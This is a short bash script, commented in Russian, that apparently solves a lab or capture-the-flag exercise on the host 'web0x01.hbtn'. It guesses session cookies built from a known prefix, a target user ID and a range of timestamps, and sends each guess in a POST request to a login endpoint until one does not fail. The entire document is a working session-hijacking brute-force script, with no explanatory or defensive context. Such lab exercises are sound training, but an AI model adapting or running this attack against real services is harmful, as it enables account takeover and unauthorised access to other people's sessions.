#!/bin/bash

# ПОДСТАВЬ ДАННЫЕ ИЗ ШАГА 1
PREFIX="c06213ef-5e39-4b1a-b3e" # Твой актуальный префикс
TARGET_ID="2490855"
START_TS="17687419500"
END_TS="17687419508"

echo "[*] Атакуем ID $TARGET_ID в диапазоне $START_TS - $END_TS"

for ts in $(seq $START_TS $END_TS); do
  # Пробуем POST запрос
  result=$(curl -s -X POST -b "hijack_session=${PREFIX}-${TARGET_ID}-${ts}" \
    "http://web0x01.hbtn/api/a1/hijack_session/login")
  
  # Если в ответе нет слова failed или есть hbtn - это победа
  if [[ "$result" != *"failed"* ]] && [[ ! -z "$result" ]]; then
    echo -e "\n\n[+++] SUCCESS!"
    echo "Timestamp: $ts"
    echo "Response: $result"
    exit 0
  fi
  echo -n "."
done
